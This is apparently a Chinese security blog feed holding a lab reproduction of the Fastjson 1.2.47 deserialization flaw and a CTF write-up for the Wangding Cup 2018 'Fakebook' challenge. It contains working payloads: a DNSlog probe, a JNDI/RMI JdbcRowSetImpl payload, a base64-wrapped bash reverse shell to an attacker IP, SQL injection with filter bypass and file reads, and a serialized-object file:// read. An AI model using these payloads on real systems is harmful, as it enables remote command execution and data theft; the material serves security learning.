&#123;</span><br><span class="line">            <span class="comment">// 1. 创建一个 ObjectOutputStream 来序列化对象并写入文件</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;person.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">objectOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOut);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 2. 序列化对象</span></span><br><span class="line">            objectOut.writeObject(person);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 3. 关闭输出流</span></span><br><span class="line">            objectOut.close();</span><br><span class="line">            fileOut.close();</span><br><span class="line">            System.out.println(<span class="string">&quot;Person对象已序列化并写入person.ser文件。&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 4. 创建一个 ObjectInputStream 来读取文件并反序列化对象</span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;person.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">objectIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 5. 反序列化对象</span></span><br><span class="line">            <span class="type">Person</span> <span class="variable">deserializedPerson</span> <span class="operator">=</span> (Person) objectIn.readObject();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 6. 关闭输入流</span></span><br><span class="line">            objectIn.close();</span><br><span class="line">            fileIn.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出反序列化后的对象信息</span></span><br><span class="line">            System.out.println(<span class="string">&quot;Deserialized Person:&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;Name: &quot;</span> + deserializedPerson.getName());</span><br><span class="line">            System.out.println(<span class="string">&quot;Age: &quot;</span> + deserializedPerson.getAge());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Person对象已序列化并写入person.ser文件。</span><br><span class="line">Deserialized Person:</span><br><span class="line">Name: John</span><br><span class="line">Age: 30</span><br></pre></td></tr></table></figure><h3 id="Fastjson-序列化与反序列化"><a href="#Fastjson-序列化与反序列化" class="headerlink" title="Fastjson 序列化与反序列化"></a>Fastjson 序列化与反序列化</h3><p>Fastjson是一个高性能的JSON处理库，它使用了一种名为“反射”的技术来进行对象的序列化和反序列化。</p><p>利用Fastjson 对对象进行序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// Java 对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John&quot;</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将 Java 对象序列化为 JSON 数据</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JSON.toJSONString(person);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印序列化后的 JSON 数据</span></span><br><span class="line">        System.out.println(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Fastjson 将一个 json 数据反序列化成为对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// JSON 数据</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;Alice\&quot;,\&quot;age\&quot;:25&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将 JSON 数据反序列化为 Java 对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> JSON.parseObject(json, Person.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印反序列化后的 Java 对象</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Name: &quot;</span> + person.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;Age: &quot;</span> + person.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 无参构造方法，必须提供，用于反序列化</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="为什么出现-type"><a href="#为什么出现-type" class="headerlink" title="为什么出现 @type"></a>为什么出现 @type</h3><p>Fastjson 在数据包传输json 数据的时候,他的结构可能为</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.example.class&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;John&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">18</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>就是说 Fastjson 会使用 @type key 值 告诉后端要进行反序列化的对象的类名为 com.exaple.class , 并且他的name属性为 John ,age 属性值为 18 </p><p>为什么需要使用 @type 呢? 比如说后端有多个类, 但是类里面都有 name age 属性 , 那程序该对哪个类进行反序列化呢?</p><p>如 : 利用一些上一个环节的类 , 如果还有一个   User 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 无参构造方法，必须提供，用于反序列化</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那程序需要对 Person 类 还是对 User 类进行反序列化化呢?</p><h3 id="Fastjson-漏洞产生"><a href="#Fastjson-漏洞产生" class="headerlink" title="Fastjson 漏洞产生"></a>Fastjson 漏洞产生</h3><p>根据上一个环节, 我们可以知道可以通过 @type来告诉程序我们需要对哪一个类进行反序列化, 还有顺便给这个类的属性进行传值即: name age ; </p><p>根据这个想法,那我们是不是也可以利用 @type 指定一些 java 里面的其他的类,而且还可以给这个类的属性进行赋值 ,这样我们不就可以控制java 里面的一些类来进行一些我们想要的操作了</p><h3 id="Fastjson-漏洞复现"><a href="#Fastjson-漏洞复现" class="headerlink" title="Fastjson 漏洞复现"></a>Fastjson 漏洞复现</h3><p>这里利用的是docker  vuln 环境 , 使用的是 Fastjson 1.2.47 </p><h3 id="Fastjson-探测"><a href="#Fastjson-探测" class="headerlink" title="Fastjson 探测"></a>Fastjson 探测</h3><p>如果我们一般遇到一个网站, 他的数据包传递数据是以 json 形式去传递数据的那我们可以利用以下办法去探测是否可能是fastjson 漏洞</p><p>报错探测  利用 不完整的json 数据,让服务器报错返回信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;age&quot;</span>:<span class="number">18</span> </span><br></pre></td></tr></table></figure><p>正确探测</p><p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230805221403680.png" alt="image-20230805221403680">  </p><p>那探测他是否存在 Fastjson 漏洞呢? </p><p><strong><a href="http://dnslog.cn/">dnslog 探测</a></strong>  </p><p>顺便探测 Fastjson 是否可以出网</p><p>先获取 Dnslog 生成子域名</p><p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230805205717335.png" alt="image-20230805205717335">   </p><p>这里有一个payload  </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;cg52u7.dnslog.cn&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ol><li><code>&quot;x&quot;</code>：这是一个 JSON 对象的键，它的值是另一个嵌套的 JSON 对象。</li><li><code>&quot;@type&quot;: &quot;java.net.Inet4Address&quot;</code>：这里指定了要反序列化的类名为 <code>java.net.Inet4Address</code>，它是 Java 中用于表示 IPv4 地址的类, 这样就告诉 JAVA 他要反序列化的类是哪个 . </li><li><code>&quot;val&quot;: &quot;nvuzfb.dnslog.cn&quot;</code>：这里指定了要传递给 <code>Inet4Address</code> 类的 <code>val</code> 属性的值为 “nvuzfb.dnslog.cn”。</li></ol><p>Fastjson 在反序列化过程中，会尝试实例化指定的类 <code>java.net.Inet4Address</code>，然后调用其构造方法进行初始化。在构造方法中，由于 <code>Inet4Address</code> 类没有正确实现 <code>readObject</code> 和 <code>readResolve</code> 方法（Fastjson 默认不允许调用类的构造方法，但会绕过 <code>readObject</code> 和 <code>readResolve</code>），攻击者可以通过构造恶意的 <code>val</code> 参数，导致 DNS 查询，从而触发 DNSlog 攻击。</p><p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230805205852760.png" alt="image-20230805205852760"> </p><p>发现 DNslog 有反应</p><p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230805210430361.png" alt="image-20230805210430361"> </p><h3 id="Fastjson-工具利用"><a href="#Fastjson-工具利用" class="headerlink" title="Fastjson 工具利用"></a>Fastjson 工具利用</h3><p>这里简单介绍一下 ,在JAVA 里面有一个 JNDI 的概念,他的全称是 <em>Java</em>命名和目录接口 , JNDI 是 Java 中用于访问命名和目录服务的 API，它可以和 RMI、LDAP 等服务集成，允许 Java 程序在分布式环境中访问远程对象和目录数据。</p><p>什么意思呢? 这里我个人理解就是利用一个服务器开始一个 JNDI 的服务接口, 这个服务里面可以包含很多的类文件, 如何我们就可以通过 RMI 或者 LDAP 协议去远程访问 JNDI 这个服务, 在这个服务里面获取我们想要的类</p><p>再简单理解一个就是让客户端去远程去包含一个类到本地,然后Fastjson 再反序列化这个类造成命令执行漏洞 (这个类因为是我们在我们自己搭建的服务器里面的,所以它可以是带有恶意攻击的类)</p><p>在Fastjson 漏洞利用中就提供了一个工具来实现这个效果的</p><p>工具:   JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar </p><p> 使用: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;要执行的命令&quot; -A 服务器地址</span><br><span class="line">如: java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;ping dnslog&quot; -A 192.168.6.5</span><br></pre></td></tr></table></figure><p>这里我们使用的java 环境是 java 1.8 </p><h3 id="Fastjson-反弹shell"><a href="#Fastjson-反弹shell" class="headerlink" title="Fastjson 反弹shell"></a>Fastjson 反弹shell</h3><p>制作反弹shell 命令 , 因为一些其他原因, 需要对 反弹shell 命令进行 base64 编码 ,再解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i  &gt;&amp; /dev/tcp/192.168.57.129/8899 0&gt;&amp;1  base64 -&gt; YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkyLjE2OC41Ny4xMjkvODg5OSAwPiYx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkyLjE2OC41Ny4xMjkvODg5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>启动 JDNI 服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkyLjE2OC41Ny4xMjkvODg5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 192.168.57.129</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230805220541483.png" alt="image-20230805220541483"> </p><p>上面框框的就是生成的payload 地址, 接下来 rmi 协议的一个个地组合到 以下payload 里面试试, 因为我也不确定哪一个一定行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://192.168.57.129:1099/dqh9mg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>记得开启 nc 监听 </p><p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230805220805780.png" alt="image-20230805220805780"> </p><p>最后在 Burp 里使用 payload</p><p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230805220953922.png" alt="image-20230805220953922"> </p><p>最后成功接收到反弹shell , 直接是 root 权限</p><p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230805221035207.png" alt="image-20230805221035207"></p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>到了最后,我再想声明一下, 因为我的能力有限, 所以如果上面有不对的地方,可以提醒一下哈 ! </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Fastjson-介绍&quot;&gt;&lt;a href=&quot;#Fastjson-介绍&quot; class=&quot;headerlink&quot; title=&quot;Fastjson  介绍&quot;&gt;&lt;/a&gt;Fastjson  介绍&lt;/h3&gt;&lt;p&gt;他就是一个拿来处理 json 数据的, 现在为止处理json 数</summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://blog.sunian.link/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Fastjson" scheme="https://blog.sunian.link/tags/Fastjson/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯 2018 Fakebook 解题</title>
    <link href="https://blog.sunian.link/2023/07/30/buuctf-1/"/>
    <id>https://blog.sunian.link/2023/07/30/buuctf-1/</id>
    <published>2023-07-30T14:07:26.000Z</published>
    <updated>2023-07-30T14:52:33.509Z</updated>
    
    <content type="html"><![CDATA[<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><h3 id="直接放-答案"><a href="#直接放-答案" class="headerlink" title="直接放 答案"></a>直接放 答案</h3><ol><li><pre><code>no=2 union/**/select 1,(select to_base64(load_file(&#39;/var/www/html/flag.php&#39;))),2,3%23<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. ```</span><br><span class="line">   2 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;%23</span><br></pre></td></tr></table></figure></code></pre></li></ol><span id="more"></span><p>不说其他的,先注册登录账号,点击进入自己注册的账号里,发现URL 可能有注入点</p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230730180623954.png" alt="image-20230730180623954" style="zoom: 50%;" />   <h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一 :"></a>解法一 :</h3><p>单引号报错, 拿到文件路径及发现有注入点</p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230730180814325.png" alt="image-20230730180814325" style="zoom:50%;" />  <p>按照惯例 先判断闭合点(搜索的类型) 判断注入类型(即找闭合点)  判断字段数量 注入</p><p>1 and 1&#x3D;1   1 and 1&#x3D;2   发现为整型查找即不用闭合</p><p>1 order by 4%23            发现当前查询表字段为 4列  , %23 URL 转码为 # </p><p>1 union select 1,2,3,4%23 发现 union select 被黑名      , 使用 union&#x2F;**&#x2F;select  替换 union select 绕过</p><p>最后构造payload 成功发现回显点位置为 2 , 此时也发现网站使用了 unserialize() 反序列化函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 union/**/select 1,2,3,4%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230730181655133.png" alt="image-20230730181655133"></p><p><strong>思路:</strong>  按照惯例网站 flag 文件可能为 flag.php 所以先尝试网站是否可以进行文件读写,如果可以那直接读取 flag.php 文件拿flag </p><p>先尝试读取现在网站使用的文 view.php  网站读取文件 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 union/**/select 1,(select to_base64(load_file(&#x27;/var/www/html/view.php&#x27;))),2,3%23</span><br></pre></td></tr></table></figure><p>load_file()  为数据库文件读写函数</p><p>to_base64()  为数据库将字符串转为 base64 编码的函数  (php 代码被读取进来可能被执行,所以先转为base64编码,待会自己转回来)</p><p>文件路径  刚刚报错信息有</p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230730182902667.png" alt="image-20230730182902667" style="zoom:50%;" />  <p>发现可以读取文件, 最后读取 flag.php 文件</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 union/**/select 1,(select to_base64(load_file(&#x27;/var/www/html/flag.php&#x27;))),2,3%23</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230730183032783.png" alt="image-20230730183032783" style="zoom:50%;" />  <p>最后将 base64 编码字符串转码拿到 flag </p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230730183120428.png" alt="image-20230730183120428" style="zoom:50%;" />  <h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二:"></a>解法二:</h3><p>通过解法一发现网站可以进行文件读取和网站使用 unserialize()反序列化函数</p><p>先读取网站文件源码 , 这里只放部分源码</p><p><strong>view.php</strong>  </p><p>payload :</p><p> 2 union&#x2F;**&#x2F;select 1,(select to_base64(load_file(‘&#x2F;var&#x2F;www&#x2F;html&#x2F;view.php’))),2,3%23</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$no</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;no&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">anti_sqli</span>(<span class="variable">$no</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no hack ~_~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">getUserByNo</span>(<span class="variable">$no</span>);  <span class="comment"># 从表获取数据</span></span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$res</span>[<span class="string">&#x27;data&#x27;</span>]);  <span class="comment"># 拿到 data 字段数据进行反序列化</span></span><br><span class="line"><span class="comment">//print_r($res);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现先从表里的 data 字段的数据然后使用 unserialize() 进行反序列化 </p><p>思路: 可以知道网站会对查询表的第四个列(即:data)的数据拿来反序列化, 所以可以控制 data列的数据的让网站对我们控制的数据进行反序列化,所以先拿到原来序列化的类   – 